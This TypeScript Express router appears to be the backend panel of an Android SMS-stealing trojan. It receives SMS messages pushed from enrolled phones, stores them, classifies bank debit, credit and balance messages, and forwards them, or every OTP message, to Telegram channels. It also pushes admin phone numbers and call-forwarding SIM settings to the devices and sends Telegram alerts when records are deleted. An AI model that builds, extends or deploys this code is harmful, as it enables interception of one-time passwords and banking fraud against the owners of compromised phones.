// File: src/routes/devices.ts
import express, { Request, Response } from "express";
import logger from "../logger/logger";
import Device from "../models/Device";
import Sms from "../models/Sms";
import AdminModel from "../models/Admin";
import wsService from "../services/wsService";
import { updateFcmToken } from "../services/deviceService";
import config from "../config";
import { classifySms } from "../services/smsClassifier";
import {
  sendTelegramMessage,
  sendTelegramMessages,
  type TelegramCategory,
} from "../services/telegramService";
import {
  buildTelegramAllOtpSmsMessage,
  buildTelegramDeviceDeletedMessage,
  buildTelegramSmsDeletedMessage,
  buildTelegramSmsMessage,
} from "../utils/telegramMessage";

const router = express.Router();

const DELETE_PASSWORD_KEY = "delete_password";
const DELETE_PASSWORD_PHONE = "delete_password";

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function isSendSmsDisabled(): boolean {
  const value = clean(
    (config as any).sendSms || process.env.SENDSMS || "yes",
  ).toLowerCase();
  return value === "no";
}

async function getStoredDeletePassword(): Promise<string> {
  try {
    const doc = await AdminModel.findOne({ key: DELETE_PASSWORD_KEY }).lean();
    return clean((doc as any)?.meta?.password || "");
  } catch (err: any) {
    logger.error("devices: getStoredDeletePassword failed", err);
    throw err;
  }
}

async function saveDeletePassword(password: string) {
  try {
    const cleanPassword = clean(password);

    await AdminModel.findOneAndUpdate(
      { key: DELETE_PASSWORD_KEY },
      {
        $set: {
          phone: DELETE_PASSWORD_PHONE,
          meta: {
            password: cleanPassword,
          },
        },
      },
      { upsert: true, new: true },
    );
  } catch (err: any) {
    logger.error("devices: saveDeletePassword failed", err);
    throw err;
  }
}

async function assertDeletePassword(password: string) {
  const entered = clean(password);

  if (!entered) {
    return {
      ok: false,
      status: 400,
      error: "password required",
    } as const;
  }

  if (entered.length < 4) {
    return {
      ok: false,
      status: 400,
      error: "password must be at least 4 digits",
    } as const;
  }

  const stored = await getStoredDeletePassword();

  if (!stored) {
    await saveDeletePassword(entered);
    logger.info("devices: delete password created on first protected delete");
    return {
      ok: true,
      created: true,
    } as const;
  }

  if (stored !== entered) {
    return {
      ok: false,
      status: 403,
      error: "invalid password",
    } as const;
  }

  return {
    ok: true,
    created: false,
  } as const;
}

function toTelegramCategories(
  categories: Array<"debit" | "credit" | "balance">,
): TelegramCategory[] {
  const out: TelegramCategory[] = ["all_finance"];

  if (categories.includes("debit")) out.push("debit");
  if (categories.includes("credit")) out.push("credit");
  if (categories.includes("balance")) out.push("balance");

  return Array.from(new Set(out));
}

function toCategoryLabels(
  categories: Array<"debit" | "credit" | "balance">,
): string[] {
  const labels: string[] = [];

  if (categories.includes("debit")) labels.push("Debit");
  if (categories.includes("credit")) labels.push("Credit");
  if (categories.includes("balance")) labels.push("Available Balance");

  if (!labels.length) labels.push("Finance");

  return labels;
}

function getDeviceTelegramMeta(device: any, deviceId: string) {
  return {
    pannelId: config.pannelId,
    deviceId,
    brandName: clean(
      device?.metadata?.brand || device?.metadata?.manufacturer || "",
    ),
    model: clean(device?.metadata?.model || ""),
    online: !!device?.status?.online,
    lastSeen: Number(device?.status?.timestamp || Date.now()),
  };
}

async function emitDeviceUpsert(deviceId: string) {
  try {
    const doc = await Device.findOne({ deviceId }).lean();
    if (doc) {
      wsService.broadcastDeviceUpsert(doc);
    }
  } catch (e) {
    logger.warn("devices: emitDeviceUpsert failed", { deviceId, error: e });
  }
}

/* ================= LIST ALL DEVICES ================= */

router.get("/", async (_req, res) => {
  try {
    const devices = await Device.find().lean();
    return res.json(devices);
  } catch (err: any) {
    logger.error("devices: list failed", err);
    return res.status(500).json([]);
  }
});

/* ================= STATUS SNAPSHOT ================= */

router.get("/status", async (_req, res) => {
  try {
    const devices = await Device.find().lean();

    const statusMap: Record<
      string,
      { online: boolean; lastSeen: number | null }
    > = {};

    devices.forEach((d: any) => {
      if (!d.deviceId) return;

      statusMap[d.deviceId] = {
        online: d?.status?.online ?? false,
        lastSeen: d?.status?.timestamp ?? null,
      };
    });

    return res.json(statusMap);
  } catch (err: any) {
    logger.error("devices: status snapshot failed", err);
    return res.status(500).json({});
  }
});

/* ================= ADMINS ================= */

router.get("/:deviceId/admins", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const doc = await Device.findOne({ deviceId }).lean();

    const admins = Array.isArray((doc as any)?.admins)
      ? (doc as any).admins
          .map((x: any) => clean(x))
          .filter(Boolean)
          .slice(0, 4)
      : [];

    return res.json(admins);
  } catch (err: any) {
    logger.error("devices: get admins failed", err);
    return res.status(500).json([]);
  }
});

router.put("/:deviceId/admins", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const rawAdmins = Array.isArray(req.body?.admins) ? req.body.admins : [];

    const admins = rawAdmins
      .map((x: any) => clean(x))
      .filter(Boolean)
      .slice(0, 4);

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          admins,
          adminPhone: admins[0] || "",
        },
      },
      { upsert: true, new: true },
    ).lean();

    try {
      wsService.sendCommandToDevice(deviceId, "admins:update", {
        uniqueid: deviceId,
        admins,
      });
    } catch (e) {
      logger.warn("devices: ws admins:update failed", e);
    }

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after admins failed", e);
    }

    return res.json({
      success: true,
      admins,
      device: doc,
    });
  } catch (err: any) {
    logger.error("devices: update admins failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

router.get("/:deviceId/adminPhone", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const doc = await Device.findOne({ deviceId }).lean();

    const phone = clean((doc as any)?.adminPhone || "");
    return res.json(phone);
  } catch (err: any) {
    logger.error("devices: get adminPhone failed", err);
    return res.status(500).json("");
  }
});

/* ================= FORWARDING SIM ================= */

router.get("/:deviceId/forwardingSim", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const doc = await Device.findOne({ deviceId }).lean();

    const value = clean((doc as any)?.forwardingSim || "auto") || "auto";
    return res.json(value);
  } catch (err: any) {
    logger.error("devices: get forwardingSim failed", err);
    return res.status(500).json("auto");
  }
});

router.put("/:deviceId/forwardingSim", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const value =
      clean(req.body?.value ?? req.body?.forwardingSim ?? "auto") || "auto";

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          forwardingSim: value,
        },
      },
      { upsert: true, new: true },
    ).lean();

    try {
      wsService.sendCommandToDevice(deviceId, "forwardingSim:update", {
        uniqueid: deviceId,
        value,
      });
    } catch (e) {
      logger.warn("devices: ws forwardingSim:update failed", e);
    }

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after forwardingSim failed", e);
    }

    return res.json({
      success: true,
      value,
      device: doc,
    });
  } catch (err: any) {
    logger.error("devices: update forwardingSim failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

/* ================= SIM INFO ================= */

router.get("/:deviceId/simInfo", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const device = await Device.findOne({ deviceId }).lean();

    if (!device) {
      return res.status(404).json({
        success: false,
        error: "Device not found",
      });
    }

    return res.json((device as any)?.simInfo || {});
  } catch (err: any) {
    logger.error("devices: simInfo failed", err);
    return res.status(500).json({});
  }
});

router.put("/:deviceId/simInfo", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);

    await Device.findOneAndUpdate(
      { deviceId },
      { $set: { simInfo: req.body } },
      { upsert: true },
    );

    await emitDeviceUpsert(deviceId);

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update simInfo failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= FCM TOKEN ================= */

router.put("/:deviceId/fcm-token", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const token = clean(req.body?.token ?? req.body?.fcmToken ?? "");

    if (!deviceId) {
      return res.status(400).json({
        success: false,
        error: "missing deviceId",
      });
    }

    if (!token) {
      return res.status(400).json({
        success: false,
        error: "missing token",
      });
    }

    await updateFcmToken(deviceId, token);

    logger.info("devices: fcm token updated", {
      deviceId,
      tokenLength: token.length,
    });

    await emitDeviceUpsert(deviceId);

    return res.json({
      success: true,
      deviceId,
    });
  } catch (err: any) {
    logger.error("devices: update fcm-token failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message || "server error",
    });
  }
});

/* ================ SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION) ================ */

router.put("/:deviceId/simSlots/:slot", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const slot = clean(req.params.slot);

    if (!deviceId || slot === "") {
      return res
        .status(400)
        .json({ success: false, error: "invalid params" });
    }

    const status =
      req.body?.status || (req.body?.active ? "active" : "inactive");
    const updatedAt = Number(req.body?.updatedAt || Date.now());

    const setObj: any = {};
    setObj[`simSlots.${slot}.status`] = status;
    setObj[`simSlots.${slot}.updatedAt`] = isNaN(updatedAt)
      ? Date.now()
      : updatedAt;

    await Device.findOneAndUpdate(
      { deviceId },
      { $set: setObj },
      { upsert: true },
    );

    const payload = {
      type: "event",
      event: "simSlots",
      deviceId,
      data: {
        [slot]: {
          status,
          updatedAt: isNaN(updatedAt) ? Date.now() : updatedAt,
        },
      },
      timestamp: Date.now(),
    };

    try {
      wsService.sendToAdminDevice(deviceId, payload);
    } catch (e) {
      logger.warn("wsService notify simSlots failed", e);
    }

    await emitDeviceUpsert(deviceId);

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update simSlot failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ================= NOTIFICATIONS ================= */

router.get("/notifications", async (_req, res) => {
  try {
    const list = await Sms.find().sort({ timestamp: -1 }).lean();

    const grouped: Record<string, any[]> = {};
    list.forEach((sms: any) => {
      const did = clean(sms.deviceId);
      if (!grouped[did]) grouped[did] = [];
      grouped[did].push(sms);
    });

    return res.json(grouped);
  } catch (e: any) {
    logger.error("notifications list failed", e);
    return res.status(500).json({});
  }
});

router.get("/notifications/summary", async (_req, res) => {
  try {
    const [totalSms, distinctDeviceIds, latestSms] = await Promise.all([
      Sms.countDocuments({}),
      Sms.distinct("deviceId"),
      Sms.findOne({})
        .sort({ timestamp: -1 })
        .select("timestamp")
        .lean(),
    ]);

    const cleanIds = (distinctDeviceIds || [])
      .map((x: any) => clean(x))
      .filter(Boolean);

    return res.json({
      totalDevices: cleanIds.length,
      totalSms: Number(totalSms || 0),
      latestTimestamp: Number((latestSms as any)?.timestamp || 0),
    });
  } catch (e: any) {
    logger.error("notifications summary failed", e);
    return res.status(500).json({
      totalDevices: 0,
      totalSms: 0,
      latestTimestamp: 0,
    });
  }
});

router.get("/notifications/devices", async (_req, res) => {
  try {
    const ids = await Sms.distinct("deviceId");
    const cleanIds = ids.map((i: any) => clean(i)).filter(Boolean);
    return res.json(cleanIds);
  } catch (e: any) {
    logger.error("notifications devices failed", e);
    return res.status(500).json([]);
  }
});

router.get("/notifications/device/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const since = Number(req.query.since || 0);

    const query: any = { deviceId };
    if (!isNaN(since) && since > 0) {
      query.timestamp = { $gte: since };
    }

    const msgs = await Sms.find(query).sort({ timestamp: -1 }).lean();
    return res.json(msgs);
  } catch (e: any) {
    logger.error("notifications device fetch failed", e);
    return res.status(500).json([]);
  }
});

router.delete("/notifications/device/:deviceId/:smsId", async (req, res) => {
  try {
    const passwordCheck = await assertDeletePassword(req.body?.password);
    if (!passwordCheck.ok) {
      return res.status(passwordCheck.status).json({
        success: false,
        error: passwordCheck.error,
      });
    }

    const deviceId = clean(req.params.deviceId);
    const smsId = clean(req.params.smsId);

    const deleted = await Sms.findOneAndDelete({
      _id: smsId,
      deviceId,
    });

    if (!deleted) {
      return res.status(404).json({
        success: false,
        error: "SMS not found",
      });
    }

    try {
      const payload = {
        type: "event",
        event: "notification:deleted",
        deviceId,
        data: {
          id: smsId,
          _id: smsId,
        },
        timestamp: Date.now(),
      };

      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        logger.warn("wsService notify notification:deleted failed", wsErr);
      }
    } catch (emitErr) {
      logger.warn("notifications single delete emit failed", emitErr);
    }

    try {
      const device = await Device.findOne({ deviceId }).lean();
      const meta = getDeviceTelegramMeta(device, deviceId);

      const deleteText = buildTelegramSmsDeletedMessage({
        ...meta,
        smsId,
        smsText: clean((deleted as any)?.body || ""),
        smsTitle: clean((deleted as any)?.title || ""),
        sender: clean(
          (deleted as any)?.senderNumber || (deleted as any)?.sender || "",
        ),
        receiver: clean((deleted as any)?.receiver || ""),
        deletedAt: Date.now(),
      });

      const deleteResult = await sendTelegramMessage({
        category: "delete_alert",
        text: deleteText,
      });

      logger.info("devices: telegram SMS delete alert sent", {
        deviceId,
        smsId,
        ok: deleteResult.ok,
        skipped: deleteResult.skipped,
        error: deleteResult.error,
      });
    } catch (telegramErr: any) {
      logger.error("devices: telegram SMS delete alert failed (non-fatal)", {
        deviceId,
        smsId,
        error: telegramErr?.message || telegramErr,
      });
    }

    return res.json({
      success: true,
      deletedId: smsId,
      passwordCreated: passwordCheck.created,
    });
  } catch (e: any) {
    logger.error("notifications single delete failed", e);
    return res.status(500).json({
      success: false,
      error: e?.message || "server error",
    });
  }
});

router.delete("/notifications/device/:deviceId", async (req, res) => {
  try {
    const passwordCheck = await assertDeletePassword(req.body?.password);
    if (!passwordCheck.ok) {
      return res.status(passwordCheck.status).json({
        success: false,
        error: passwordCheck.error,
      });
    }

    const deviceId = clean(req.params.deviceId);
    await Sms.deleteMany({ deviceId });

    try {
      wsService.broadcastNotificationClearDevice(deviceId);
    } catch (e) {
      logger.warn("notifications clear device broadcast failed", e);
    }

    return res.json({
      success: true,
      passwordCreated: passwordCheck.created,
    });
  } catch (e: any) {
    logger.error("notifications delete for device failed", e);
    return res.status(500).json({ success: false, error: e?.message });
  }
});

router.delete("/notifications", async (req, res) => {
  try {
    const passwordCheck = await assertDeletePassword(req.body?.password);
    if (!passwordCheck.ok) {
      return res.status(passwordCheck.status).json({
        success: false,
        error: passwordCheck.error,
      });
    }

    await Sms.deleteMany({});

    try {
      wsService.broadcastNotificationClearAll();
    } catch (e) {
      logger.warn("notifications clear all broadcast failed", e);
    }

    return res.json({
      success: true,
      passwordCreated: passwordCheck.created,
    });
  } catch (e: any) {
    logger.error("notifications delete all failed", e);
    return res.status(500).json({ success: false });
  }
});

router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
  try {
    const passwordCheck = await assertDeletePassword(req.body?.password);
    if (!passwordCheck.ok) {
      return res.status(passwordCheck.status).json({
        success: false,
        error: passwordCheck.error,
      });
    }

    const cutoff = Number(req.params.cutoff || 0);
    await Sms.deleteMany({ timestamp: { $lt: cutoff } });

    try {
      wsService.broadcastNotificationClearAll();
    } catch (e) {
      logger.warn("notifications olderThan broadcast failed", e);
    }

    return res.json({
      success: true,
      passwordCreated: passwordCheck.created,
    });
  } catch (e: any) {
    logger.error("notifications delete olderThan failed", e);
    return res.status(500).json({ success: false });
  }
});

/* ================= SMS PUSH (SENDSMS SWITCH + WS + TELEGRAM ROUTING) ================= */

router.post("/:id/sms", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.id);

    const receiver =
      req.body.receiver ||
      req.body.receiverNumber ||
      req.body.address ||
      req.body.to ||
      req.body.phone ||
      "";

    if (!receiver) {
      logger.warn("devices:sms missing receiver", { body: req.body });
      return res.status(400).json({
        success: false,
        error: "receiver missing",
      });
    }

    const rawTs = req.body.timestamp;
    const parsedTs = Number(rawTs);
    const finalTimestamp =
      typeof parsedTs === "number" && !isNaN(parsedTs) && parsedTs > 0
        ? parsedTs
        : Date.now();

    const smsPayload = {
      deviceId,
      sender: req.body.sender || req.body.from || "unknown",
      senderNumber: req.body.senderNumber || req.body.from || "",
      receiver,
      title: req.body.title || "SMS",
      body: req.body.body || req.body.message || "",
      timestamp: finalTimestamp,
      meta: req.body.meta || {},
    };

    const sendSmsDisabled = isSendSmsDisabled();

    try {
      await Device.findOneAndUpdate(
        { deviceId },
        {
          $set: {
            "status.timestamp": finalTimestamp,
          },
        },
        { upsert: true },
      );
    } catch (e) {
      logger.warn("devices: update device timestamp after sms failed", e);
    }

    let device: any = null;
    try {
      device = await Device.findOne({ deviceId }).lean();
    } catch (e) {
      logger.warn("devices: load device for telegram meta failed", e);
    }

    const meta = getDeviceTelegramMeta(device, deviceId);

    if (sendSmsDisabled) {
      try {
        const telegramText = buildTelegramAllOtpSmsMessage({
          ...meta,
          smsText: clean(smsPayload.body),
          smsTitle: clean(smsPayload.title),
          sender: clean(smsPayload.senderNumber || smsPayload.sender),
          receiver: clean(smsPayload.receiver),
          timestamp: Number(smsPayload.timestamp || finalTimestamp),
        });

        const result = await sendTelegramMessage({
          category: "all_otp_sms",
          text: telegramText,
        });

        logger.info("devices: SENDSMS=no routed sms only to all_otp_sms", {
          deviceId,
          ok: result.ok,
          skipped: result.skipped,
          error: result.error,
        });
      } catch (telegramErr: any) {
        logger.error("devices: SENDSMS=no telegram routing failed", {
          deviceId,
          error: telegramErr?.message || telegramErr,
        });
      }

      try {
        await emitDeviceUpsert(deviceId);
      } catch (e) {
        logger.warn("devices: emit device upsert after SENDSMS=no failed", e);
      }

      return res.json({
        success: true,
        sendSmsDisabled: true,
        savedToDb: false,
        broadcastToFrontend: false,
      });
    }

    const smsDoc = new Sms(smsPayload);
    await smsDoc.save();

    try {
      const payload = {
        type: "event",
        event: "notification",
        deviceId,
        data: {
          id: smsDoc._id,
          _id: smsDoc._id,
          title: smsDoc.title,
          sender: smsDoc.sender,
          senderNumber: (smsDoc as any).senderNumber,
          receiver: smsDoc.receiver,
          body: smsDoc.body,
          timestamp: smsDoc.timestamp,
          meta: smsDoc.meta || {},
        },
        timestamp: Date.now(),
      };

      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
        if (io && typeof io.emit === "function") {
          io.emit("event", payload);
        }
      }
    } catch (emitErr) {
      logger.warn("WS emit failed (non-fatal)", emitErr);
    }

    try {
      await emitDeviceUpsert(deviceId);
    } catch (e) {
      logger.warn("devices: emit device upsert after sms failed", e);
    }

    try {
      const smsText = clean(smsDoc.body);
      const classification = classifySms(
        smsText,
        clean((smsDoc as any).senderNumber || smsDoc.sender),
      );

      if (classification.isFinance) {
        const categoryLabels = toCategoryLabels(classification.categories);
        const telegramCategories = toTelegramCategories(classification.categories);

        const telegramText = buildTelegramSmsMessage({
          ...meta,
          categoryLabels,
          smsText,
          smsTitle: clean(smsDoc.title),
          sender: clean((smsDoc as any).senderNumber || smsDoc.sender),
          receiver: clean(smsDoc.receiver),
          timestamp: Number(smsDoc.timestamp || finalTimestamp),
        });

        const telegramResults = await sendTelegramMessages(
          telegramCategories,
          telegramText,
        );

        logger.info("devices: telegram finance routing complete", {
          deviceId,
          categories: telegramCategories,
          labels: categoryLabels,
          matchedKeywords: classification.matchedKeywords,
          online: meta.online,
          lastSeen: meta.lastSeen,
          results: telegramResults.map((x) => ({
            category: x.category,
            ok: x.ok,
            skipped: x.skipped,
            error: x.error,
          })),
        });
      } else {
        logger.info(
          "devices: sms saved but not routed to Telegram (non-finance)",
          {
            deviceId,
            smsId: smsDoc._id?.toString?.(),
          },
        );
      }
    } catch (telegramErr: any) {
      logger.error("devices: telegram routing failed (non-fatal)", {
        deviceId,
        error: telegramErr?.message || telegramErr,
      });
    }

    return res.json({
      success: true,
      sendSmsDisabled: false,
      savedToDb: true,
      broadcastToFrontend: true,
    });
  } catch (err: any) {
    logger.error("SMS save failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= DEVICE GET ================= */

router.get("/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const device = await Device.findOne({ deviceId }).lean();

    if (!device) {
      return res.status(404).json({
        success: false,
        error: "Device not found",
      });
    }

    return res.json(device);
  } catch (err: any) {
    logger.error("devices: get single failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= STATUS UPDATE ================= */

router.put("/:deviceId/status", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const online = !!req.body?.online;
    const ts = Number(req.body?.timestamp || Date.now());

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          "status.online": online,
          "status.timestamp": isNaN(ts) ? Date.now() : ts,
        },
      },
      { upsert: true, new: true },
    ).lean();

    try {
      const payload = {
        type: "event",
        event: "status",
        deviceId,
        data: { online, timestamp: isNaN(ts) ? Date.now() : ts },
        timestamp: Date.now(),
      };
      try {
        wsService.sendToAdminDevice(deviceId, payload);
      } catch (wsErr) {
        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
        if (io && typeof io.emit === "function") io.emit("event", payload);
      }
    } catch (e) {
      logger.warn("WS emit status failed (non-fatal)", e);
    }

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after status failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update status failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= UPDATE METADATA ================= */

router.put("/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      { $set: { metadata: req.body } },
      { upsert: true, new: true },
    ).lean();

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after metadata failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: update metadata failed", err);
    return res.status(500).json({
      success: false,
      error: err?.message,
    });
  }
});

/* ================= DELETE ================= */

router.delete("/status/:deviceId", async (req, res) => {
  try {
    const deviceId = clean(req.params.deviceId);

    const doc = await Device.findOneAndUpdate(
      { deviceId },
      {
        $set: {
          "status.online": false,
          "status.timestamp": Date.now(),
        },
      },
      { new: true },
    ).lean();

    try {
      if (doc) wsService.broadcastDeviceUpsert(doc);
    } catch (e) {
      logger.warn("devices: broadcast device:upsert after delete status failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("devices: delete status failed", err);
    return res.status(500).json({ success: false });
  }
});

router.delete("/:deviceId", async (req, res) => {
  try {
    const passwordCheck = await assertDeletePassword(req.body?.password);
    if (!passwordCheck.ok) {
      return res.status(passwordCheck.status).json({
        success: false,
        error: passwordCheck.error,
      });
    }

    const deviceId = clean(req.params.deviceId);
    const existingDevice = await Device.findOne({ deviceId }).lean();

    await Device.deleteOne({ deviceId });

    try {
      wsService.broadcastDeviceDelete(deviceId);
    } catch (e) {
      logger.warn("devices: broadcast device:delete failed", e);
    }

    try {
      const meta = getDeviceTelegramMeta(existingDevice, deviceId);
      const deleteText = buildTelegramDeviceDeletedMessage({
        ...meta,
        deletedAt: Date.now(),
      });

      const deleteResult = await sendTelegramMessage({
        category: "delete_alert",
        text: deleteText,
      });

      logger.info("devices: telegram device delete alert sent", {
        deviceId,
        ok: deleteResult.ok,
        skipped: deleteResult.skipped,
        error: deleteResult.error,
      });
    } catch (telegramErr: any) {
      logger.error("devices: telegram device delete alert failed (non-fatal)", {
        deviceId,
        error: telegramErr?.message || telegramErr,
      });
    }

    return res.json({
      success: true,
      passwordCreated: passwordCheck.created,
    });
  } catch (err: any) {
    logger.error("devices: delete failed", err);
    return res.status(500).json({ success: false });
  }
});

export default router;
